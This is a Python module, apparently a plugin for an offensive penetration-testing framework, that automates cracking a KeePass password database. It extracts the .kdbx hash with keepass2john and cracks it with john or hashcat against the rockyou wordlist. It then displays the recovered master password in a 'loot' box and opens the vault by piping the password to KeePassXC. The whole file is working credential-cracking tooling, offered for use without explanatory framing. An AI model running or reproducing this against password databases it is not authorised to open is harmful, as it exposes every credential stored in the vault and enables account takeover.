import subprocess
import shlex
import os
from pathlib import Path

# --- TACTICAL UI STANDARD (v2026) PALETTE ---
G = '\033[92m'  # Success/Loot
C = '\033[96m'  # Targets/Hostnames
Y = '\033[93m'  # Commands/Secrets/Alerts
B = '\033[94m'  # Structure/Labels/Tree
R = '\033[91m'  # Failures/Errors
W_BOLD = '\033[1m'  # Primary Headers
W = '\033[0m'   # Reset
DIM = '\033[2m'

def run(data, cred, args):
    DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"

    # 1. PHASE HEADER
    action_name = "KEEPASS CRACKING"
    print(f"\n{W_BOLD}[*] PHASE: {action_name}{W}")

    # 2. METADATA TREE
    extra = getattr(args, "extra", []) or []
    if len(extra) < 1:
        print(f"  {R}└── Error: Missing target .kdbx file{W}")
        return data

    db_file = Path(extra[0]).expanduser()
    wordlist = extra[1] if len(extra) >= 2 else DEFAULT_WORDLIST
    
    # Labeling as per Standard
    target_display = f"{C}{db_file.name}{W}"
    user_display = f"{C}{data.get('user', 'current_session')}{W}"
    
    print(f"  {B}├──{W} Target:  {target_display}")
    print(f"  {B}└──{W} Operator: {user_display}")

    # 3. COMMAND TRANSPARENCY (Step 1: Extraction)
    hash_file = Path(db_file.stem + ".hash")
    extract_cmd = ["keepass2john", str(db_file)]
    
    print(f"  {B}└──{W} Command: {Y}{shlex.join(extract_cmd)}{W}")

    try:
        result = subprocess.run(extract_cmd, capture_output=True, text=True, check=True)
        hash_output = next((line.strip() for line in result.stdout.splitlines() if "$keepass$" in line), None)
        
        if not hash_output:
            raise ValueError("No valid KeePass hash found")
        hash_file.write_text(hash_output + "\n")
    except Exception as e:
        print(f"  {R}└── Failure: {e}{W}")
        return data

    # 4. COMMAND TRANSPARENCY (Step 2: Cracking)
    use_john = "*2*" in hash_output
    if use_john:
        crack_cmd = ["john", str(hash_file), f"--wordlist={wordlist}"]
        show_cmd = ["john", str(hash_file), "--show"]
    else:
        crack_cmd = ["hashcat", "-a", "0", "-m", "13400", str(hash_file), wordlist]
        show_cmd = ["hashcat", "-m", "13400", str(hash_file), "--show"]

    print(f"  {B}└──{W} Command: {Y}{shlex.join(crack_cmd)}{W}")
    
    # Execution (Output suppressed to keep minimalism if required, or streamed)
    subprocess.run(crack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 5. THE LOOT BOX
    res = subprocess.run(show_cmd, capture_output=True, text=True)
    password = None
    for line in res.stdout.splitlines():
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[1].strip():
                password = parts[1].strip()
                break

    if password:
        print(f"\n{G}┌── RECOVERED CREDENTIALS ────────────────────────────────┐{W}")
        print(f"{G}│{W}  Database: {G}{db_file.name}{W}")
        print(f"{G}│{W}  Password: {G}{password}{W}")
        print(f"{G}└──────────────────────────────────────────────────────────┘{W}")
        
        # Optional persistent launch (with password via stdin)
        print(f"\n{B}└──{W} Launch: {Y}keepassxc {db_file} --pw-stdin{W}")

        launched = False

        for binary in ["keepassxc", "keepass"]:
            try:
                cmd = [binary, str(db_file), "--pw-stdin"]

                subprocess.Popen(
                    cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    text=True
                ).communicate(password + "\n")

                print(f"  {G}└── Opened with: {binary}{W}")
                launched = True
                break

            except FileNotFoundError:
                continue
            except Exception as e:
                print(f"  {R}└── Launch failed: {e}{W}")
                break

        if not launched:
            print(f"  {Y}└── Hint: Install keepassxc or open manually{W}")


    else:
        print(f"\n{R}┌── CRACK FAILURE ────────────────────────────────────────┐{W}")
        print(f"{R}│{W}  Status:   {R}Wordlist Exhausted{W}")
        print(f"{R}└──────────────────────────────────────────────────────────┘{W}")

    return data